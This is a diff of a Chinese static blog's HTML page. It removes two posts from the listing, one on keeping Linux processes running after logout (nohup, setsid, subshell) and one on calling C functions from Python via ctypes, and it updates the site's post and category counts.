-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-04 15:12:58" itemprop="dateModified" datetime="2020-02-04T15:12:58+08:00">2020-02-04</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="0-“-amp-”"><a href="#0-“-amp-”" class="headerlink" title="0. “&amp;”"></a>0. “&amp;”</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一般我们可在结尾加上&quot;&amp;&quot;来将命令同时放入后台运行</span><br><span class="line">但是关掉会话之后，进程就会被杀掉</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-nohup"><a href="#1-nohup" class="headerlink" title="1. nohup"></a>1. nohup</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nohup ping www.ibm.com &amp;</span><br><span class="line"># nohup 的用途就是让提交的命令忽略 hangup 信号</span><br><span class="line"># 标准输出和标准错误缺省会被重定向到 nohup.out 文件中，也可使用 &gt;filename 2&gt;&amp;1 来重定向文件名</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-setsid"><a href="#2-setsid" class="headerlink" title="2. setsid"></a>2. setsid</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setsid ping www.ibm.com</span><br><span class="line"># 将命令进程放到1号进程下面（就不是子进程了，不再接收hangup信号）</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-subshell-的小技巧"><a href="#3-subshell-的小技巧" class="headerlink" title="3. subshell 的小技巧"></a>3. subshell 的小技巧</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(ping www.ibm.com &amp;)</span><br><span class="line"># 括号包起来</span><br><span class="line"># 让命令在subshell运行</span><br><span class="line"># 父 ID（PPID）为1，不属于当前终端的子进程，从而也就不会受到当前终端的 HUP 信号的影响了。</span><br></pre></td></tr></table></figure>
-
-<h4 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h4><p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-nohup/" target="_blank" rel="external nofollow noopener noreferrer">让进程在后台运行更可靠的几种方法</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://spiderblog.cn/Python-call-C.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_bear.png">
-      <meta itemprop="name" content="Mr.Zhou">
-      <meta itemprop="description" content="喜欢的编程语言是Python，喜欢做爬虫与数据相关">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SpiderBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/Python-call-C.html" class="post-title-link" itemprop="url">Python-call-C</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-01-03 12:19:08" itemprop="dateCreated datePublished" datetime="2020-01-03T12:19:08+08:00">2020-01-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-04 15:13:41" itemprop="dateModified" datetime="2020-02-04T15:13:41+08:00">2020-02-04</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/C-C/" itemprop="url" rel="index">
-                    <span itemprop="name">C&C++</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="Python3-调用C语言代码"><a href="#Python3-调用C语言代码" class="headerlink" title="Python3 调用C语言代码"></a>Python3 调用C语言代码</h3><h5 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">centos7+python3.6</span><br></pre></td></tr></table></figure>
-
-<h5 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python中的ctypes模块可能是Python调用C方法中最简单的一种。</span><br><span class="line">ctypes模块提供了和C语言兼容的数据类型和函数来加载dll文件，</span><br><span class="line">因此在调用时不需对源文件做任何的修改，也正是如此奠定了这种方法的简单性。</span><br></pre></td></tr></table></figure>
-
-<h5 id="准备文件"><a href="#准备文件" class="headerlink" title="准备文件"></a>准备文件</h5><h6 id="1-准备C语言程序，保存为add-c"><a href="#1-准备C语言程序，保存为add-c" class="headerlink" title="1.准备C语言程序，保存为add.c"></a>1.准备C语言程序，保存为add.c</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_int</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">add_float</span><span class="params">(<span class="keyword">float</span>, <span class="keyword">float</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_int</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">add_float</span><span class="params">(<span class="keyword">float</span> num1, <span class="keyword">float</span> num2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h6 id="2-编译成so库"><a href="#2-编译成so库" class="headerlink" title="2.编译成so库"></a>2.编译成so库</h6><p>输入命令即可，会出现一个.so文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -Wl,-soname,adder -o adder.so -fPIC add.c</span><br></pre></td></tr></table></figure>
-
-<h6 id="3-准备python代码，保存为python-c-py"><a href="#3-准备python代码，保存为python-c-py" class="headerlink" title="3.准备python代码，保存为python-c.py"></a>3.准备python代码，保存为python-c.py</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"> </span><br><span class="line"><span class="comment">#load the shared object file</span></span><br><span class="line">adder = ctypes.cdll.LoadLibrary(<span class="string">'./adder.so'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Find sum of integers</span></span><br><span class="line">res_int = adder.add_int(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">print(<span class="string">"4 + 5 = "</span> + str(res_int))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#Find sum of floats</span></span><br><span class="line">a = ctypes.c_float(<span class="number">5.5</span>)</span><br><span class="line">b = ctypes.c_float(<span class="number">4.1</span>)</span><br><span class="line"> </span><br><span class="line">add_float = adder.add_float</span><br><span class="line">add_float.restype = ctypes.c_float</span><br><span class="line"> </span><br><span class="line">print(<span class="string">"5.5 + 4.1 = "</span> + str(add_float(a, b)))</span><br></pre></td></tr></table></figure>
-
-<h6 id="4-执行"><a href="#4-执行" class="headerlink" title="4.执行"></a>4.执行</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 python-c.py</span><br></pre></td></tr></table></figure>
-
-<p>执行结果如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 + 5 &#x3D; 9</span><br><span class="line">5.5 + 4.1 &#x3D; 9.600000381469727</span><br></pre></td></tr></table></figure>
-
-<h6 id="5-特殊说明"><a href="#5-特殊说明" class="headerlink" title="5.特殊说明"></a>5.特殊说明</h6><ul>
-<li>在Python文件中，一开始先导入ctypes模块，然后使用cdll.LoadLibrary函数来加载我们创建的库文件。这样我们就可以通过变量adder来使用C类库中的函数了。当adder.add_int()被调用时，内部将发起一个对C函数add_int的调用。ctypes接口允许我们在调用C函数时使用原生Python中默认的字符串型和整型。</li>
-<li>而对于其他类似布尔型和浮点型这样的类型，必须要使用正确的ctype类型才可以。如向adder.add_float()函数传参时, 我们要先将Python中的十进制值转化为c_float类型，然后才能传送给C函数。这种方法虽然简单，清晰，但是却很受限。例如，并不能在C中对对象进行操作。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1137,20 +1150,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
